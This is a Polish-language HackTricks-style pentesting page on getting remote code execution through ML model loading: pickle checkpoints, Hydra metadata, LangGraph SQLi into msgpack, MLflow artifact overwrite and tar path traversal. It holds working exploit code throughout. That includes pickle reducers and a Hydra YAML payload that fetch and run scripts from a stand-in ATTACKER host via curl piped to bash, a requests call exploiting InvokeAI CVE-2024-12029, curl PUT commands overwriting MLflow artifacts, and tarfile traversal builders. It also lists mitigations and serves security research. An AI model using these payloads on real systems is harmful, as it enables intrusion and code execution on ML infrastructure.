# RCE przez modele

{{#include ../banners/hacktricks-training.md}}

## Ładowanie modeli w celu uzyskania RCE

Modele Machine Learning są zazwyczaj udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch itd. Można je ładować na maszynach deweloperów lub w systemach produkcyjnych. Modele zazwyczaj nie powinny zawierać złośliwego kodu, ale w niektórych przypadkach można ich użyć do wykonania dowolnego kodu w systemie jako zamierzonej funkcji albo z powodu podatności w bibliotece ładującej modele.

Poniższa tabela przedstawia przykładowe podatności z tej kategorii:

| **Framework / narzędzie** | **Podatność (CVE, jeśli dostępne)** | **Wektor RCE** | **Źródła** |
|----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Niebezpieczna deserializacja w* `torch.load` **(CVE-2025-32434)**                                                              | Złośliwy pickle w checkpointcie modelu prowadzi do wykonania kodu (z pominięciem zabezpieczenia `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + pobranie złośliwego modelu powoduje wykonanie kodu; RCE przez deserializację Javy w API zarządzania                                        | |
| **NVIDIA Merlin Transformers4Rec** | Niebezpieczna deserializacja checkpointu przez `torch.load` **(CVE-2025-23298)**                                           | Niezaufany checkpoint uruchamia reducer pickle podczas `load_model_trainer_states_from_checkpoint` → wykonanie kodu w workerze ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + niebezpieczny hook rozszerzeń MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kontrolowany przez użytkownika klucz `filter` wstrzykuje składnię SQL/JSON-path, `UNION SELECT` tworzy fałszywy wiersz checkpointu, a następnie deserializacja `msgpack` importuje i wywołuje wybrany przez atakującego kod Python | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (niebezpieczny YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Ładowanie modelu z YAML używa `yaml.unsafe_load` (wykonanie kodu) <br> Ładowanie modelu z warstwą **Lambda** uruchamia dowolny kod Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsowanie TFLite)                                                                                          | Spreparowany model `.tflite` powoduje przepełnienie liczby całkowitej → uszkodzenie sterty (potencjalne RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Ładowanie modelu przez `joblib.load` wykonuje pickle z payloadem `__reduce__` atakującego                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (niebezpieczne `np.load`) *sporna*                                                                              | Domyślnie `numpy.load` dopuszczał tablice obiektów pickle – złośliwy plik `.npy/.npz` powoduje wykonanie kodu                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Ścieżka do zewnętrznych wag modelu ONNX może prowadzić poza katalog (odczyt dowolnych plików) <br> Złośliwy plik tar z modelem ONNX może nadpisać dowolne pliki (prowadząc do RCE) | |
| ONNX Runtime (ryzyko projektowe)  | *(Brak CVE)* Niestandardowe operatory ONNX / przepływ sterowania                                                                                    | Model z niestandardowym operatorem wymaga załadowania natywnego kodu atakującego; złożone grafy modelu nadużywają logiki, aby wykonywać niezamierzone obliczenia   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Użycie API ładowania modeli z włączoną opcją `--model-control` pozwala na path traversal przy użyciu ścieżek względnych w celu zapisu plików (np. nadpisania `.bashrc` w celu uzyskania RCE)    | |
| **GGML (format GGUF)**      | **CVE-2024-25664 … 25668** (wiele przepełnień sterty)                                                                         | Nieprawidłowy plik modelu GGUF powoduje przepełnienia bufora sterty w parserze, umożliwiając wykonanie dowolnego kodu w systemie ofiary                     | |
| **Keras (starsze formaty)**   | *(Brak nowego CVE)* Starszy model Keras H5                                                                                         | Złośliwy model HDF5 (`.h5`) z warstwą Lambda nadal wykonuje kod podczas ładowania (Keras safe_mode nie obejmuje starszego formatu – „downgrade attack”) | |
| **Inne** (ogólnie)        | *Błąd projektowy* – serializacja Pickle                                                                                         | Wiele narzędzi ML (np. formaty modeli oparte na pickle, Python `pickle.load`) wykonuje dowolny kod osadzony w plikach modeli, jeśli nie zastosowano zabezpieczeń | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Niezaufane metadane przekazane do `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Kontrolowane przez atakującego metadane/konfiguracja modelu ustawiają `_target_` na dowolny obiekt wywoływalny (np. `builtins.exec`) → kod zostaje wykonany podczas ładowania, nawet w przypadku „bezpiecznych” formatów (`.safetensors`, `.nemo`, repozytorium `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ponadto istnieją modele oparte na Python pickle, takie jak te używane przez [PyTorch](https://github.com/pytorch/pytorch/security), których można użyć do wykonania dowolnego kodu w systemie, jeśli nie zostaną załadowane z `weights_only=True`. Dlatego każdy model oparty na pickle może być szczególnie podatny na tego rodzaju ataki, nawet jeśli nie wymieniono go w powyższej tabeli.

### Metadane Hydra → RCE (działa nawet z safetensors)

`hydra.utils.instantiate()` importuje i wywołuje dowolny określony kropkami `_target_` w obiekcie konfiguracji/metadanych. Gdy biblioteki takie jak Hugging Face Transformers przekazują niezaufane **metadane modelu** do `instantiate()`, atakujący może podać obiekt wywoływalny i argumenty, które zostaną natychmiast wykonane podczas ładowania modelu (bez potrzeby użycia pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Przykładowy payload (działa w `model_config.yaml` w `.nemo`, `config.json` repozytorium lub `__metadata__` wewnątrz `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Kluczowe punkty:
- Uruchamiane przed inicjalizacją modelu w `restore_from/from_pretrained` w NeMo, koderach HuggingFace uni2TS i loaderach FlexTok.
- Ciągowa lista blokowanych elementów w Hydra może zostać ominięta przez alternatywne ścieżki importu (np. `enum.bltns.eval`) lub nazwy rozwiązywane przez aplikację (np. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok parsuje również metadane zapisane jako ciągi za pomocą `ast.literal_eval`, co umożliwia DoS (gwałtowny wzrost zużycia CPU/pamięci) przed wywołaniem Hydra.

### 🆕  RCE w InvokeAI przez `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny interfejs webowy open source dla Stable-Diffusion. Wersje **5.3.1 – 5.4.2** udostępniają endpoint REST `/api/v2/models/install`, który pozwala użytkownikom pobierać i ładować modele z dowolnych URL-i.<sup>[[1]](#references)</sup>

Wewnętrznie endpoint ostatecznie wywołuje:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Gdy dostarczony plik jest **checkpointem PyTorch (`*.ckpt`)**, `torch.load` wykonuje **deserializację pickle**. Ponieważ zawartość pochodzi bezpośrednio z adresu URL kontrolowanego przez użytkownika, atakujący może umieścić w checkpointcie złośliwy obiekt z własną metodą `__reduce__`; metoda ta jest wykonywana **podczas deserializacji**, co prowadzi do **zdalnego wykonania kodu (RCE)** na serwerze InvokeAI.

Podatności przypisano identyfikator **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Przebieg exploitacji

1. Utwórz złośliwy checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Umieść `payload.ckpt` na kontrolowanym przez siebie serwerze HTTP (np. `http://ATTACKER/payload.ckpt`).
3. Wywołaj podatny endpoint (uwierzytelnianie nie jest wymagane):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Gdy InvokeAI pobiera plik, wywołuje `torch.load()` → gadget `os.system` uruchamia się, a atakujący uzyskuje możliwość wykonania kodu w kontekście procesu InvokeAI.

Gotowy exploit: moduł **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje cały proces.<sup>[[3]](#references)</sup>

#### Warunki

•  InvokeAI 5.3.1-5.4.2 (domyślna wartość flagi scan to **false**)
•  Endpoint `/api/v2/models/install` jest dostępny dla atakującego
•  Proces ma uprawnienia do wykonywania poleceń powłoki

#### Środki zaradcze

* Uaktualnij do **InvokeAI ≥ 5.4.3** – poprawka domyślnie ustawia `scan=True` i skanuje pliki w poszukiwaniu malware przed deserializacją.<sup>[[2]](#references)</sup>
* Podczas programowego ładowania checkpointów używaj `torch.load(file, weights_only=True)` lub nowego helpera [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Wymuszaj allow-listy / podpisy źródeł modeli i uruchamiaj usługę z minimalnymi uprawnieniami.

> ⚠️ Pamiętaj, że każdy format oparty na Python pickle (w tym wiele plików `.pt`, `.pkl`, `.ckpt`, `.pth`) jest z natury niebezpieczny do deserializacji z niezaufanych źródeł.

---

Przykład doraźnego środka zaradczego, jeśli musisz nadal uruchamiać starsze wersje InvokeAI za reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Transformers4Rec RCE przez niebezpieczne `torch.load` (CVE-2025-23298)

Transformers4Rec firmy NVIDIA (część Merlin) udostępniał niebezpieczny mechanizm wczytywania checkpointów, który bezpośrednio wywoływał `torch.load()` na ścieżkach podanych przez użytkownika. Ponieważ `torch.load` korzysta z Pythonowego `pickle`, kontrolowany przez atakującego checkpoint może wykonać dowolny kod za pomocą reducer podczas deserializacji.<sup>[[5]](#references)</sup>

Podatna ścieżka (przed poprawką): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Dlaczego prowadzi to do RCE: W Pythonowym `pickle` obiekt może definiować reducer (`__reduce__`/`__setstate__`), który zwraca funkcję wywoływalną i argumenty. Funkcja ta jest wykonywana podczas odtwarzania obiektu z pickle. Jeśli taki obiekt znajduje się w checkpoincie, jego kod uruchamia się, zanim zostaną użyte jakiekolwiek wagi.

Minimalny przykład złośliwego checkpointu:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Wektory dostarczenia i zasięg rażenia:
- Zainfekowane checkpointy/modele udostępniane w repozytoriach, bucketach lub rejestrach artefaktów
- Zautomatyzowane potoki wznawiania/wdrażania, które automatycznie ładują checkpointy
- Kod jest wykonywany wewnątrz workerów treningowych/wnioskowania, często z podwyższonymi uprawnieniami (np. jako root w kontenerach)

Poprawka: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zastąpił bezpośrednie wywołanie `torch.load()` ograniczonym deserializatorem z listą dozwolonych typów, zaimplementowanym w `transformers4rec/utils/serialization.py`. Nowy loader weryfikuje typy/pola i zapobiega wywoływaniu dowolnych funkcji podczas ładowania.<sup>[[7]](#references)</sup>

Wskazówki dotyczące zabezpieczania checkpointów PyTorch:
- Nie wykonuj unpicklingu niezaufanych danych. W miarę możliwości używaj nieuruchamialnych formatów, takich jak [Safetensors](https://huggingface.co/docs/safetensors/index) lub ONNX.
- Jeśli musisz użyć serializacji PyTorch, upewnij się, że `weights_only=True` (obsługiwane w nowszych wersjach PyTorch) albo użyj własnego unpicklera z listą dozwolonych typów, podobnego do poprawki Transformers4Rec.<sup>[[4]](#references)</sup>
- Weryfikuj pochodzenie/podpisy modeli i wykonuj deserializację w sandboxie (seccomp/AppArmor; użytkownik inny niż root; ograniczony system plików i brak wychodzących połączeń sieciowych).
- Monitoruj nieoczekiwane procesy potomne uruchamiane przez usługi ML podczas ładowania checkpointów; śledź użycie `torch.load()`/`pickle`.

Odnośniki do POC i podatnej wersji/poprawki:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Podatny loader sprzed poprawki: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC złośliwego checkpointu: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader po poprawce: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Przykład – tworzenie złośliwego modelu PyTorch

- Utwórz model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Załaduj model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserializacja Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD firmy Tencent udostępnia endpoint `resnet`, który deserializuje dane kontrolowane przez użytkownika. ZDI potwierdziło, że zdalny atakujący może nakłonić ofiarę do wczytania złośliwej strony/pliku, spowodować wysłanie przez nią spreparowanego serializowanego obiektu do tego endpointu i wywołać deserializację z uprawnieniami `root`, co prowadzi do pełnego przejęcia systemu.

Przebieg exploita przypomina typowe nadużycie pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Każdy gadget dostępny podczas deserializacji (konstruktory, `__setstate__`, wywołania zwrotne frameworka itp.) można uzbroić w ten sam sposób, niezależnie od tego, czy transportem było HTTP, WebSocket, czy plik umieszczony w monitorowanym katalogu.

### LangGraph checkpointer SQLi → MessagePack RCE

Ten łańcuch ataku jest interesujący, ponieważ atakujący **nie musi przesyłać złośliwego pliku modelu**. Zamiast tego aplikacja udostępnia **API trwałego przechowywania stanu agenta AI** (`get_state_history(..., filter=...)`), a dane wejściowe użytkownika trafiają do kreatora zapytań checkpointera.

#### 1. Strukturalne SQLi w filtrach metadanych

Podatny wzorzec SQLite wyglądał tak:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Wartość jest wiązana później, ale `query_key` jest konkatenowany do **ciągu ścieżki JSON**, więc `'` wewnątrz klucza słownika zamyka `'$.{query_key}'` i wstrzykuje SQL. Ta sama zasada dotyczy **ścieżek JSON, identyfikatorów, operatorów, `LIMIT` i pól TTL**: placeholdery chronią tylko wartości, a nie składnię strukturalną zapytania.

#### 2. `UNION SELECT` może trafiać do dalszych sinków, a nie tylko umożliwiać kradzież danych

Zapytanie zwraca `type` i zserializowane bajty `checkpoint`, które są później wykorzystywane jako:

```python
self.serde.loads_typed((type, checkpoint))
```

Oznacza to, że SQLi w klauzuli `WHERE` może wstrzyknąć **fałszywy wiersz wyniku**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Jeśli późniejszy kod analizuje, deserializuje, zapisuje lub wykonuje dowolną wybraną kolumnę, powiąż te kolumny z ich sinkami. W tym przypadku fałszywy wiersz zmienia SQLi w **deserializację kontrolowaną przez atakującego**.

#### 3. Niebezpieczne hooki rozszerzeń MessagePack są odpowiednikiem gadżetów kodu

Ścieżka `msgpack` w LangGraph używała niestandardowego hooka rozszerzeń, który rozpakowywał zagnieżdżoną krotkę i wykonywał:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Zatem obiekt rozszerzenia MessagePack kodujący coś równoważnego `("os", "system", "id > /tmp/pwned")` importuje `os`, wyszukuje `system` i uruchamia polecenie. Podczas audytu frameworków AI sprawdzaj **niestandardowe deserializatory MessagePack/JSON/pickle** pod kątem dynamicznego importowania, reflection lub wywoływania dowolnych callable.

#### 4. Praktyczny schemat audytu frameworków agentowych

Sprawdź każde dane wejściowe kontrolowane przez użytkownika, które trafiają do:
- API listujących historię stanu / pamięć / odtwarzanie / checkpointy
- kreatorów ustrukturyzowanych filtrów generujących SQL lub fragmenty zapytań Redis
- niestandardowych deserializatorów (`pickle`, `msgpack`, hooks obiektów `json`, konstruktory YAML)
- ścieżek odzyskiwania, które ufają wierszom zwróconym przez warstwę trwałego przechowywania

Ten konkretny łańcuch ataku dotyczył wdrożeń LangGraph hostowanych samodzielnie, korzystających z checkpointerów **SQLite** lub **Redis**, gdy niezaufani użytkownicy mogli kontrolować `filter`. W ujawnieniu wskazano następujące wersje z poprawkami: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` oraz `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Nadpisanie artefaktu MLflow PyFunc prowadzące do RCE przez pickle

MLflow PyFunc utworzony na podstawie `PythonModel` może przechowywać serializowany obiekt jako `python_model.pkl`. Metadane modelu wskazują `mlflow.pyfunc.model` jako jego loader, a implementacja MLflow używa tej nazwy pliku dla zapisanego modelu Python. W rezultacie uprawnienia do zapisu w magazynie artefaktów mogą umożliwić wykonanie kodu w innej aplikacji, która później wczyta model.<sup>[[17]](#references)[[18]](#references)</sup>

Przydatny łańcuch ataku to **uprawnienia do zapisu artefaktów → podmiana pliku pickle → wymuszenie ponownego wczytania go przez konsumenta inference**. W przypadku eksperymentu korzystającego z proxied root `mlflow-artifacts:/...` wylicz ścieżkę artefaktów eksperymentu, runu i modelu. Serwer śledzący udostępnia metody `GET` i `PUT` pod adresem `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Minimalny reducer może wykonać polecenie, gdy tylko konsument odczyta artefakt za pomocą `unpickle`. Wygenerowanie payloadu przy użyciu wersji Pythona zadeklarowanej w `MLmodel` pozwala uniknąć problemów ze zgodnością.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Wywołaj operację, która **wczytuje istniejący model**, np. predykcję, ocenianie lub wdrożenie. Nie rozpoczynaj od ponownego trenowania, ponieważ trening może zastąpić złośliwy artefakt nowym modelem. Błąd aplikacji nie wyklucza exploita: reducer zwraca całkowity kod wyjścia polecenia zamiast użytecznego modelu. Zacznij od obserwowalnego efektu ubocznego, takiego jak ICMP lub callback HTTP, a następnie zastąp go końcowym payloadem.<sup>[[20]](#references)</sup>

Podczas oceny rozróżnij uprawnienia do utworzenia runu od uprawnień do nadpisywania artefaktów należących do innego runu. Sprawdź uwierzytelnianie i uprawnienia do aktualizacji poszczególnych runów, skontroluj nieoczekiwane modyfikacje `python_model.pkl` i uwzględnij pochodzenie oraz integralność modelu jako część granicy wykonania. Aktualny kod MLflow obsługuje również ustawienie `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` i zaleca artefakty models-from-code zamiast wczytywania danych cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Ujawnione serwery modeli i infrastruktura ML

Wczytanie złośliwego modelu nie jest jedynym sposobem na wykonanie kodu w infrastrukturze ML. Interfejsy API do przesyłania zadań, endpointy walidacji kodu i pobieranie modeli z rejestru przez samodzielnie hostowane usługi AI mogą prowadzić do wykonania kodu bez użycia pliku modelu. Zobacz [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Modele do path traversal

Jak opisano w [**tym wpisie na blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), większość formatów modeli używanych przez różne frameworki AI bazuje na archiwach, zwykle `.zip`. Dlatego możliwe może być wykorzystanie tych formatów do przeprowadzenia ataków path traversal, umożliwiających odczyt dowolnych plików z systemu, w którym wczytywany jest model.<sup>[[16]](#references)</sup>

Na przykład poniższy kod pozwala utworzyć model, który po wczytaniu utworzy plik w katalogu `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Lub za pomocą poniższego kodu możesz utworzyć model, który po załadowaniu utworzy dowiązanie symboliczne do katalogu `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Szczegółowe omówienie: deserializacja .keras i poszukiwanie gadgetów

Aby zapoznać się ze szczegółowym przewodnikiem po wewnętrznych mechanizmach .keras, RCE w warstwie Lambda, problemie z dowolnym importem w wersjach ≤ 3.8 oraz wyszukiwaniu gadgetów w allowlist po poprawce, zobacz:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog OffSec – „CVE-2024-12029 – deserializacja niezaufanych danych w InvokeAI”](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit poprawki InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentacja modułu Metasploit w Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – kwestie bezpieczeństwa dotyczące torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog ZDI – CVE-2025-23298: uzyskanie zdalnego wykonania kodu w NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Biuletyn ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit poprawki Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Podatny loader sprzed poprawki (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC złośliwego checkpointu (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader po poprawce (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – zdalne wykonanie kodu przy użyciu nowoczesnych formatów i bibliotek AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Dokumentacja Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit blokujący listę (ostrzeżenie przed RCE) w Hydra](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – od SQLi do RCE: wykorzystanie checkpointera LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Wykorzystanie błędów Archive Slip w wartościowych programach bug bounty AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Biuletyn Snyk i proof of concept PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Kod źródłowy MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [REST API MLflow – endpointy pobierania i przesyłania artefaktów](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
